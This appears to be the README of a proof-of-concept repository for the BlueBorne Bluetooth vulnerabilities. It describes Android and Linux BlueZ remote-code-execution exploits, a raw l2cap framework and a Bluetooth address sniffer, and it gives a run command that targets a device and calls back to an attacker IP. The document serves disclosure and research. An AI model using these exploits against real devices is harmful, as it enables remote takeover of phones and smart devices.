BlueBorne Exploits & Framework
=============================

This repository contains a PoC code of various exploits for the BlueBorne vulnerabilities.

Under 'android' exploits for the Android RCE vulnerability (CVE-2017-0781), and the SDP Information leak vulnerability (CVE-2017-0785) can be found.

Under 'linux-bluez' exploits for the Linux-RCE vulnerability (CVE-2017-1000251) can be found (for Amazon Echo, and Samsung Gear S3).

Under 'l2cap_infra' a general testing framework to send and receive raw l2cap messages (using scapy) can be found.

Under 'nRF24_BDADDR_Sniffer' a tool to capture bluetooth mac addresses (BDADDR) over the air, using a nRF24L01 chip

For more details on BlueBorne, you may read the full technical white paper available here:

https://www.armis.com/blueborne/

In addition a several detailed blog posts on the exploitation of these vulnerability can be found here:

https://www.armis.com/blog/


===============

Dependencies:

    pip2 packages: pybluez, pwn, scapy
    
    - sudo apt-get install libbluetooth-dev
    - sudo pip2 install pybluez pwn scapy

    To run the exploits, the root of this repository needs to be in the PYTHONPATH:
    
    export PYTHONPATH=$PYTHONPATH:<repo-path>


BlueBorne Android Exploit PoC (merged from another repo)
=============================

This repository contains a PoC code of BlueBorne's Android RCE vulnerability (CVE-2017-0781).
It also uses the SDP Information leak vulnerability (CVE-2017-0785) to bypass ASLR.
It achieves code execution on a Google Pixel Android smartphone running version 7.1.2 with Security Patch Level July or August 2017.
This code can also be altered a bit in order to target other Android smartphones.

All code can be found under android dir.

For more details you may read the full technical white paper available here:

https://www.armis.com/blueborne/

In addition a detailed blog post on the exploitation of this vulnerability is available here:
https://www.armis.com/blueborne-on-android-exploiting-rce-over-the-air/


===============

Dependencies:

    pip2 packages: pybluez, pwn
    
    - sudo apt-get install libbluetooth-dev
    - sudo pip2 install pybluez pwn

    A CSR USB bluetooth adapter. We need to change the MAC address, and so we use a vendor specific HCI command to do this
    for the CSR bluetooth adapter.
    - An alternative adapter can also be used - the only thing to alter is the set_rand_bdaddr function.

To run:

    sudo python2 doit.py hci0 <target-bdaddr> <attacker-ip>

IP needs to be accessible from the victim (should be the IP of the machine that runs the exploit)


